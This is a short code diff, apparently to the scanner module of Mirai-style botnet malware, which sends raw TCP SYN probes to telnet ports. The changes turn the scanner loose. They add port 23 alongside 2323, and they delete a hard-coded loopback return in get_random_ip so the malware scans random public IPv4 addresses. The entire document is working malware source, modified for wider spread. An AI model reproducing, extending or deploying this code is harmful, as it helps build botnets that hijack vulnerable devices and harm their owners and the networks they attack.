@@ -214,7 +214,14 @@ void scanner_init(void)
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
-                tcph->dest = htons(2323);
+                if (i % 10 == 0)
+                {
+                    tcph->dest = htons(2323);
+                }
+                else
+                {
+                    tcph->dest = htons(23);
+                }
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
                 tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));
@@ -248,7 +255,7 @@ void scanner_init(void)
                 continue;
             if (iph->protocol != IPPROTO_TCP)
                 continue;
-            if (tcph->source != htons(2323))
+            if (tcph->source != htons(23) && tcph->source != htons(2323))
                 continue;
             if (tcph->dest != source_port)
                 continue;
@@ -666,12 +673,13 @@ static void setup_connection(struct scanner_connection *conn)
 
 static ipv4_t get_random_ip(void)
 {
-    return inet_addr("127.0.0.1");
     uint32_t tmp;
     uint8_t o1, o2, o3, o4;
+
     do
     {
         tmp = rand_next();
+
         o1 = tmp & 0xff;
         o2 = (tmp >> 8) & 0xff;
         o3 = (tmp >> 16) & 0xff;
